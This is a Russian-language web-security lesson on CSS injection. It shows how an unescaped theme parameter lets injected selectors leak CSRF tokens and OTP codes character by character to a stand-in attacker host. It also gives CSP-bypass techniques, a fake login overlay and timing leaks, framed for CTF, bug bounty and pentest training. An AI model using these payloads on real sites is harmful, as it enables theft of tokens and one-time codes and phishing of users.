## Вопрос, с которого всё начинается

На прошлом уроке мы крали данные незакрытым тегом. Но что, если тег закрыть нельзя, а `img` запрещён? Оказывается, есть ещё один «неисполняемый» язык, который умеет утекать данные — **CSS**.

Вопрос: как стили, которые просто раскрашивают страницу, могут выдать секрет? Ответ: CSS умеет **выбирать элементы по значению атрибута** и **подгружать внешние ресурсы**. Комбинируя это, можно посимвольно вытянуть токен из HTML — без единой строчки JavaScript. Разберём на одном примере.

## Наш пример

Есть сайт `portal.example` с настройкой «тема оформления». Мы заметили, что выбранный цвет подставляется в `<style>` без проверки. Отправим необычное значение и посмотрим, что вернётся:

```bash
$ curl -s 'https://portal.example/?theme=red%22%7Dbody%7Bbackground:blue%7D%2F%2A' | grep -o 'body{background:blue}'
body{background:blue}
```

Мы отправили `red"}` — кавычка и фигурная скобка **закрыли** значение и правило, а дальше добавили своё: `body{background:blue}`. Сервер вставил это в `<style>` без экранирования. Значит, мы **контролируем CSS** на странице. Теперь используем это для утечки.

## Шаг 1: CSS-селектор как «оракул»

CSS умеет выбирать элементы по значению атрибута:

```css
input[name="csrf"][value^="a"] { background: url(https://ATTACKER/leak?c=a); }
```

Разберём: `[value^="a"]` — «атрибут `value` начинается с `a`» (`^=` — «начинается с», `$=` — «заканчивается», `*=` — «содержит»). Если селектор **совпал**, браузер загружает картинку по `url(...)` — и делает запрос на наш сервер. Если не совпал — запроса нет.

Это и есть оракул: по факту запроса мы узнаём, что значение начинается с конкретного символа. Перебирая символы, восстанавливаем секрет.

## Шаг 2: находим цель

На странице есть форма с CSRF-токеном:

```bash
$ curl -s https://portal.example/form -b 'session=victim' | grep -o 'value="[^"]*"'
value="a1b2c3..."
```

Токен `a1b2c3` лежит в атрибуте `value`. Наша CSS-инъекция на **той же странице** — значит, мы можем его «прочитать».

## Шаг 3: поднимаем приёмник и бьём по первому символу

```bash
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...
```

Вставляем правило, которое проверяет первый символ:

```css
"} input[name="csrf"][value^="a"]{background:url(//ATTACKER_IP:8000/leak?c=a)}
```

Жертва открывает страницу — и если токен начинается с `a`, браузер грузит `background` и делает запрос. В логах приёмника видим:

```
ATTACKER_IP - - "GET /leak?c=a HTTP/1.1" 404 -
```

Первый символ — `a`. Теперь итерируем: `value^="a1"`, `value^="a1b"`… Так токен собирается слева направо. Для 32-символьного hex-токена с алфавитом `0-9a-f` нужно не более 16×32 запросов.

## Шаг 4: полный арсенал селекторов

| Селектор | Значение |
|----------|----------|
| `input[value^="a"]` | значение начинается с `a` |
| `input[value$="z"]` | значение заканчивается на `z` |
| `input[value*="tok"]` | значение содержит `tok` |
| `input[value="a"]` | точное совпадение |
| `form:has(input[value^="1"])` | вложенная проверка (новые браузеры) |
| `:not(...)` | исключение — для построения оракула |

Комбинация с `:has()` дотягивается до значений, которые не лежат в простых атрибутах. Это особенно опасно на страницах с **OTP/2FA**: если одноразовый код попадает в атрибут, его можно восстановить прямо из DOM:

```css
form:has(input[name="otp"][value^="1"]) { background: url(//ATTACKER/otp1); }
```

## Шаг 5: каналы утечки

`url()` в `background` — не единственный канал. Если CSP блокирует картинки, работает шрифт:

| Канал | Как утекает |
|-------|-------------|
| `background:url(...)` | запрос при совпадении селектора |
| `@font-face` + `unicode-range` | посимвольно через загрузку шрифта |
| `@import url(...)` | загрузка внешнего CSS |
| `list-style-image:url(...)` | ещё один запрос |
| тайминг (`animation`) | утечка без исходящих запросов |

`@font-face` с `unicode-range` — самый мощный канал: он работает, даже когда `url()` в `background` вырезан CSP для изображений, но разрешён для шрифтов:

```css
@font-face { font-family: leak; src: url(https://ATTACKER/f?c=a); unicode-range: U+0061; }
```

Порядок применения: сначала пробуем `url()`, затем `@font-face`, при жёстком CSP — тайминги.

## Шаг 6: обход CSP

CSS-инъекция часто обходит CSP, который запрещает inline-скрипты. Проверим политику:

```bash
$ curl -sI https://portal.example/ | grep -i content-security-policy
content-security-policy: script-src 'self'; img-src 'self'; style-src 'self' 'unsafe-inline'
```

Здесь `img-src 'self'` — наш хост заблокирован, но `style-src` разрешает `unsafe-inline`. Тогда:

| Защита | Обход |
|--------|-------|
| `img-src 'none'` | `@font-face` (через `font-src`), `@import` |
| `style-src 'self'` | `@import` с same-origin редиректом |
| Фильтр `url(` | `image-set()`, `src()`, `@import` |
| Ограничение длины | собирать правило по частям через несколько параметров |

Проверить, что канал работает, можно в DevTools → Network: если запрос к нашему серверу уходит, эксфильтрация идёт.

## Шаг 7: визуальный фишинг

CSS-инъекция даёт не только утечку. Можно нарисовать фальшивый логин-оверлей поверх настоящей страницы:

```css
"} body{visibility:hidden} .fake{visibility:visible;position:fixed;top:0;left:0}
```

Жертва вводит пароль в поддельную форму, который уходит на наш сервер. Это уже социальная инженерия, но корень — та же CSS-инъекция.

## Шаг 8: тайминг-атака, когда исходящие запросы запрещены

Иногда CSP запрещает и картинки, и шрифты — тогда утечка строится **по времени**. Идея: селектор совпал → запускается длинная анимация → страница «замирает» дольше обычного. Измеряя задержку, судят о совпадении символа.

```css
input[value^="a"] { animation: slow 3s; }
@keyframes slow { from { opacity: 0.99; } to { opacity: 1; } }
```

Это медленнее сетевого канала, но работает при полном отсутствии исходящих запросов. На практике порядок такой: сначала `url()`, затем `@font-face`, и лишь при жёстком CSP — тайминги. Чтобы выбрать канал, всегда смотри, какие директивы разрешены: `img-src`, `font-src`, `style-src`.

## Шаг 9: где CSS-инъекция встречается

- **Пользовательские темы:** «свой CSS», «фон профиля», «цвет» без экранирования — прямой `<style>`-контекст.
- **Markdown/HTML-рендереры:** `<style>` в пользовательском посте, если санитайзер пропускает тег.
- **Атрибут `style="..."`:** тег `<style>` вставить нельзя, но `background:url(...)` в значении работает.
- **SVG:** `<svg><style>` внутри загружаемой картинки.
- **Email:** письмо с `<style>` и внешними `url()` — трекинг-пиксель по условию.

Отдельно стоит помнить, что CSS-инъекция — хороший **усилитель XSS**: если санитайзер вырезает `<script>`, но оставляет `<style>`, можно вытащить секреты без JS и передать их дальше.

## Что мы теперь знаем

- CSS-инъекция — контроль стилей через `style`/`<style>`/атрибут `style`.
- Селектор `[value^="a"]` работает как оракул: совпал — браузер грузит ресурс.
- Посимвольно восстанавливается значение атрибута (токен, OTP).
- Каналы: `background:url()`, `@font-face`, `@import`, тайминги.
- CSS работает **без JavaScript** и часто при строгом CSP.
- Можно подменить UI (фишинг-оверлей).
- Артефакт — восстановленный токен, а не «CSS вставился».

## На что смотреть дальше

- **Не считай CSS-инъекцию «не багом»** — она даёт утечку секретов и UI-подмену.
- **Проверь CSP:** `style-src`/`img-src` определяют, какой канал доступен.
- **Посимвольный перебор дорог** — для длинных токенов оптимизируй (группы, параллельно).
- **`:has()` расширяет возможности** — дотягивается до значений, не лежащих в простых атрибутах.
- **SVG и email** — тоже несут CSS-контекст (трекинг-пиксели).
- **Только с согласия** — payload сохраняется и срабатывает у жертв.

## Куда дальше

Дальше мы разберём, как обойти **CSP** напрямую — через JSONP, угон скриптов и DOM-clobbering (`web-csp-bypass`). А пока главное запомни: **CSS — это тоже язык утечки**, и селектор `[value^=...]` читает секреты без JavaScript.

## Где пригодится

- **CTF (Web):** задачи, где флаг/токен в атрибуте, а XSS заблокирован — CSS-утечка.
- **Bug bounty:** кража CSRF-токенов и OTP через CSS-инъекцию — редкий, но оплачиваемый баг.
- **Пентест:** тестирование пользовательских тем/настроек стилей.
- **Работа (AppSec/Dev):** понимание, почему нельзя подставлять ввод в CSS без санитайза.
